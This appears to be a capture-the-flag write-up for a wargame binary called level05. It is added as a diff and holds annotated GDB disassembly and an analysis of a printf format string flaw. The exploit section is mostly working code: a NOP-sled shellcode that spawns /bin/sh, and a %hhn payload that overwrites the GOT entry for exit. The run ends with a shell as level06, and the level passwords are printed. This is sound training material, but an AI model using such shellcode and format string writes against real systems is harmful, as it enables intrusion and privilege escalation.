@@ -1,0 +1,201 @@
+login : pw
+	level05 : 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+
+################################################
+GDB
+################################################
+
+=> disas main
+	0x08048444 <+0>:	push   ebp
+	0x08048445 <+1>:	mov    ebp,esp
+	0x08048447 <+3>:	push   edi
+	0x08048448 <+4>:	push   ebx
+	0x08048449 <+5>:	and    esp,0xfffffff0
+	0x0804844c <+8>:	sub    esp,0x90
+		=> p/d 0x90
+			144
+		# At most 144 bytes allocated on the satck for main function
+
+	0x08048452 <+14>:	mov    DWORD PTR [esp+0x8c],0x0
+	0x0804845d <+25>:	mov    eax,ds:0x80497f0
+	0x08048462 <+30>:	mov    DWORD PTR [esp+0x8],eax
+	0x08048466 <+34>:	mov    DWORD PTR [esp+0x4],0x64
+	0x0804846e <+42>:	lea    eax,[esp+0x28]
+	0x08048472 <+46>:	mov    DWORD PTR [esp],eax
+	0x08048475 <+49>:	call   0x8048350 <fgets@plt>
+		=> x 0x80497f0
+			0x80497f0 <stdin@@GLIBC_2.0>:	0
+		=> p/d 0x64
+			100
+		# New local var, [esp+0x8c], let's call it 'a'
+		# New local var, [esp+0x28], lets call it 'buf'
+	
+	0x0804847a <+54>:	mov    DWORD PTR [esp+0x8c],0x0
+	0x08048485 <+65>:	jmp    0x80484d3 <main+143>
+		# [esp+0x8c] = 'a' = 0
+
+	0x08048487 <+67>:	lea    eax,[esp+0x28] # Jumped from main+186
+	0x0804848b <+71>:	add    eax,DWORD PTR [esp+0x8c]
+	0x08048492 <+78>:	movzx  eax,BYTE PTR [eax]
+	0x08048495 <+81>:	cmp    al,0x40
+	0x08048497 <+83>:	jle    0x80484cb <main+135>
+		=> p/d 0x40
+			64
+		# [esp+0x28] = 'buf'
+		# [esp+0x8c] = 'a'
+		# buf[a] <= 64 to jump
+
+	0x08048499 <+85>:	lea    eax,[esp+0x28]
+	0x0804849d <+89>:	add    eax,DWORD PTR [esp+0x8c]
+	0x080484a4 <+96>:	movzx  eax,BYTE PTR [eax]
+	0x080484a7 <+99>:	cmp    al,0x5a
+	0x080484a9 <+101>:	jg     0x80484cb <main+135>
+		=> p/d 0x5a
+			90
+		# [esp+0x28] = 'buf'
+		# [esp+0x8c] = 'a'
+		# buf[a] > 90 to jump
+
+	0x080484ab <+103>:	lea    eax,[esp+0x28]
+	0x080484af <+107>:	add    eax,DWORD PTR [esp+0x8c]
+	0x080484b6 <+114>:	movzx  eax,BYTE PTR [eax]
+	0x080484b9 <+117>:	mov    edx,eax
+	0x080484bb <+119>:	xor    edx,0x20
+	0x080484be <+122>:	lea    eax,[esp+0x28]
+	0x080484c2 <+126>:	add    eax,DWORD PTR [esp+0x8c]
+	0x080484c9 <+133>:	mov    BYTE PTR [eax],dl
+		=> p/d 0x20
+			32
+		# [esp+0x28] = 'buf'
+		# [esp+0x8c] = 'a'
+		# buf[a] = buf[a] XOR 32
+	
+	0x080484cb <+135>:	add    DWORD PTR [esp+0x8c],0x1 # Jumped from main+83 and main+101
+	
+	0x080484d3 <+143>:	mov    ebx,DWORD PTR [esp+0x8c] # Jumped from main+65
+	0x080484da <+150>:	lea    eax,[esp+0x28]
+	0x080484de <+154>:	mov    DWORD PTR [esp+0x1c],0xffffffff
+	0x080484e6 <+162>:	mov    edx,eax
+	0x080484e8 <+164>:	mov    eax,0x0
+	0x080484ed <+169>:	mov    ecx,DWORD PTR [esp+0x1c]
+	0x080484f1 <+173>:	mov    edi,edx
+	0x080484f3 <+175>:	repnz scas al,BYTE PTR es:[edi]
+	0x080484f5 <+177>:	mov    eax,ecx
+	0x080484f7 <+179>:	not    eax
+	0x080484f9 <+181>:	sub    eax,0x1
+	0x080484fc <+184>:	cmp    ebx,eax
+	0x080484fe <+186>:	jb     0x8048487 <main+67>
+		# [esp+0x28] = 'buf'
+		# As usual, repnz scas will check each byte for it to be equal at al
+		# al = 0
+		# Then NOT the counter ecs as it is decremented
+		# Equivalent to strlen(buf)
+		
+
+	0x08048500 <+188>:	lea    eax,[esp+0x28]
+	0x08048504 <+192>:	mov    DWORD PTR [esp],eax
+	0x08048507 <+195>:	call   0x8048340 <printf@plt>
+		# [esp+0x28] =  'buf'
+		# printf(buf), possible format string attack
+
+	0x0804850c <+200>:	mov    DWORD PTR [esp],0x0
+	0x08048513 <+207>:	call   0x8048370 <exit@plt>
+
+################################################
+SUMMARY
+################################################
+
+fgets called, it reads 100 char, stores it in buf
+All char in buf whose value is between 64 (excluded) and 90 (included) will be xored with 32
+call printf with only sanitized buf as arg
+	Possible format string attack
+
+################################################
+EXPLOIT
+################################################
+
+# ascii 65 = A
+# ascii 90 = Z
+# so all character that are within A and Z will be xored
+# A = 65 = 1000001
+#   = 32 =  100000
+# a = 97 = 1100001
+# So it's basically just a tolower()
+# Looks like it will be easy
+# Keep in mind I need to overthrite the ret eip from printf 
+#	as main doesnt return, rather exit
+# I will need a shell code to overwrite eip, so
+
+=> env -i exploit=$(python -c 'print "\x90"*10000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"') gdb level05
+
+=> unset env LINES
+=> unset env COLUMNS
+=> start
+=> x/s *environ
+	0xffffb874:	 "exploit=...
+	# shell code nopsled start address
+
+=> p/x 0xffffb874+(10000/2)
+	0xffffcbfc
+	# Target value to overwrite eip, middle of nopsled
+
+=> b *main+195
+	# Right before printf call
+=> b *main+200
+	# Right after printf call (main address = 0x0804850c)
+
+=> continue
+	=> '%1$p    %2$p    '
+=> si
+	0x08048340 in printf@plt ()
+
+=> x/32wx $esp
+	0xffffb64c:	0x0804850c	0xffffb678	0x00000064	0xf7fcfac0
+	0xffffb65c:	0xf7ec3af9	0xffffb69f	0xffffb69e	0x00000000
+	0xffffb66c:	0xffffffff	0xffffb724	0x00000000	0x70243125
+	0xffffb67c:	0x20202020	0x70243225	0x20202020	0x00c3000a
+	# pushed next instruction address is 0xffffb64c 
+	# Our input starts in 0xffffb678
+
+=> continue
+	0x64    0xf7fcfac0    
+	# We can easily deduce our target pointer index to be the 10th one on the stack
+
+# I tried to overwrite value in 0xffffb64c without success
+# After investigation
+# I cant overwrite it, simply due to the XOR in the function
+# 4c is 'L' in ascii and becomes after the xor 'l'
+# So I was overwriting 0xffffb66c
+
+# My only choice left is to overwrite the exit function
+# exit function address is 0x08048370 (ro segment, dynamic linking)
+
+=> disas 0x8048370
+	0x08048370 <+0>:	jmp    DWORD PTR ds:0x80497e0
+	# data segment can be overwritten
+	# targer pointer is 0x080497e0
+
+# Summary
+# I need to overwrite 0x080497e0 with 0xffffcbfc
+# 0xffffcbfc > INT_MAX, meaning I cant put it at once with printf n specifier
+# 0xfc = 252 at "\xe0\x97\x04\x08"
+# 0xcb = 203 at "\xe1\x97\x04\x08"
+# 0xff = 255 at "\xe2\x97\x04\x08"
+# 0xff = 255 at "\xe3\x97\x04\x08"
+# Lets keep in mind that if number of char % 256 == 0
+#	we overflow a char and restart from 0
+
+# Lets create our payload
+# The idea is overwrite each byte pointed by 0x080497e0 one at a time
+# After each overwriting, you reset your counter by making the sum equals to 256
+=> python -c 'print "\xe0\x97\x04\x08" + "\xe1\x97\x04\x08" + "\xe2\x97\x04\x08" + "\xe3\x97\x04\x08" + "%236p" + "%10$hhn" + "aaaa" + "%203p" + "%11$hhn" + "%53p" + "%255p" + "%12$hhn" + "a" + "%255p" + "%13$hhn"' > /tmp/d
+
+=> r < /tmp/d
+	process 2789 is executing new program: /bin/dash
+
+=> env -i exploit=$(python -c 'print "\x90"*10000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"') ./level05 < /tmp/d
+
+=> whoami
+	level06
+=> cat /home/users/level06/.pass
+	h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
